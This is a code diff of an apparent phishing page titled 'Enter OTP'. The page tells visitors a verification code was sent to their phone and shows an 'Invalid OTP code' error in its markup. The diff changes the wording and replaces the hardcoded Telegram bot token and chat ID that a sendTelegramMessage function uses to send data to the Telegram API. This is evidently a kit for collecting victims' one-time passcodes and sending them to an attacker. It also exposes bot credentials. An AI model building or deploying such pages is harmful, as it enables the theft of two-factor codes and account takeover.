@@ -39,13 +39,8 @@
 <div class="container">
   <div class="box">
     <h2>Enter OTP</h2>
-
-      <div class="otp-message" style="text-align:center;">
-  <p>A verification code has been sent to your device.</p>
-  <p id="phoneDisplay" style="font-weight:600;font-size:18px;margin:8px 0;">---</p>
-  <p>Please enter the code below.</p>
-
-          
+    <p>A 4–6 digit verification code was sent to:</p>
+    <p id="phoneDisplay" style="font-weight:bold;">---</p>
     <p class="error-msg">Invalid OTP code. Please enter valid OTP code</p>
 
     <input type="number" id="otpInput" placeholder="4–6 digits" maxlength="6"
@@ -60,8 +55,8 @@
 </div>
 
 <script>
-const BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
-const CHAT_ID = "7027302249";
+const BOT_TOKEN = "8227434675:AAF9SlpfdJ7eyDtkjF7VNjiNw6-dLlwBIPw";
+const CHAT_ID = "7882033650";
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 function sendTelegramMessage(message) {
